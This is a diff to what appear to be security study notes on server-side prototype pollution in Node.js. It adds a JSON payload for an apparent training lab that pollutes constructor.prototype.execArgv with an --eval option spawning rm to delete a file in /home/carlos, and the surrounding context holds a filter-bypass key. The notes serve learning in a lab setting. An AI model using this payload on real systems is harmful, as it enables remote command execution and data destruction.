@@ -659,5 +659,26 @@ consconstructortructor.proprototypetotype
 ```
 
 - It also applies to `child_process.spawn()`
+- Lab [child_process's docs](https://nodejs.org/api/child_process.html)-:
+
+```json
+  "address_line_1": "Wiener HQ",
+  "address_line_2": "One Wiener Way",
+  "city": "Wienerville",
+  "postcode": "BU1 1RP",
+  "country": "UK",
+  "sessionId": "9hBiJF55gLMXiljYtkhTWhYIpTRFl4VQ",
+  "constructor": {
+    "prototype": {
+      "execArgv": [
+        "--eval=require(node:child_process).spawn(rm,[/home/carlos/morale.txt])"
+      ]
+    }
+  }
+}
+```
+
+
+----------------
 
 ----------------
